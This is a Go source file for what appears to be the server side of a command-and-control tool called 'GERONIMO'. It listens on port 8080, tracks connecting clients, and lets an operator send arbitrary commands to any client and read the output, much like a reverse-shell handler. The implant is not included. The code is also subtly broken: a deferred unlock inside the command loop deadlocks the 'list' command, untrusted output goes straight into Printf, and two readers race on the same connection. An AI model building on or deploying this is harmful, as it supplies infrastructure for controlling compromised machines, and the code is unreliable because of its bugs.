// server.go
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	FIONREAD = 0x541B
)

var (
	clientMap = make(map[string]net.Conn)
	mu        sync.Mutex
)

func main() {
	ln, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Println("Error starting server:", err)
		return
	}
	defer ln.Close()

	fmt.Println("GERONIMO\n---------\nThe server has started and is listening on port 8080\n!! Sometimes it may look like you cant type anything, just press enter and type again !!\n")

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				fmt.Println("Error accepting connection:", err)
				continue
			}
			go handleClient(conn)
		}
	}()

	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print(">> ")
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		if input == "" {
			continue
		} else if input == "clear" {
			fmt.Print("\033[H\033[2J")
		} else if input == "list" {
			mu.Lock()
			defer mu.Unlock()

			var activeClients []string
			for id, conn := range clientMap {
				if isClientConnected(conn) {
					activeClients = append(activeClients, id)
				} else {
					// If client is no longer connected, remove it from the map
					delete(clientMap, id)
				}
			}

			if len(activeClients) == 0 {
				fmt.Println("No active clients")
			} else {
				fmt.Println("Active clients:")
				for _, id := range activeClients {
					fmt.Println("Client ID:", id)
				}
			}
		} else if strings.HasPrefix(input, "run") {
			if len(input) < 4 {
				fmt.Println("Usage: run <client_id> <command>")
				continue
			}
			parts := strings.SplitN(input, " ", 3)
			if len(parts) < 3 {
				fmt.Println("Usage: run <client_id> <command>")
				continue
			}
			clientID := parts[1]
			command := parts[2]

			mu.Lock()
			conn, ok := clientMap[clientID]
			mu.Unlock()

			if !ok {
				fmt.Println("Client ID not found")
				continue
			}

			fmt.Fprintf(conn, command+"\n")
			go handleCommandResponse(conn)
		} else {
			fmt.Println("Unknown command")
		}
	}
}

func handleClient(conn net.Conn) {
	defer conn.Close()

	id := generateClientID()
	fmt.Println("New client connected with ID:", id, "\n>>")

	mu.Lock()
	clientMap[id] = conn
	mu.Unlock()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		output := scanner.Text()
		fmt.Printf(output)
	}

	mu.Lock()
	delete(clientMap, id)
	mu.Unlock()
	fmt.Println("\nClient disconnected:", id, "\n>>")
}

func handleCommandResponse(conn net.Conn) {
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		output := scanner.Text()
		fmt.Println(output)
	}
}

func generateClientID() string {
	return fmt.Sprintf("%08d", time.Now().UnixNano()%100000000)
}

func isClientConnected(conn net.Conn) bool {
	// Send a ping message to check if the client is still connected
	_, err := conn.Write([]byte("PING\n"))
	if err != nil {
		return false
	}

	// Set a deadline to read the response
	conn.SetReadDeadline(time.Now().Add(1 * time.Second))
	_, err = conn.Read(make([]byte, 4)) // Read only up to 4 bytes (response to PING)
	if err != nil {
		return false
	}

	return true
}
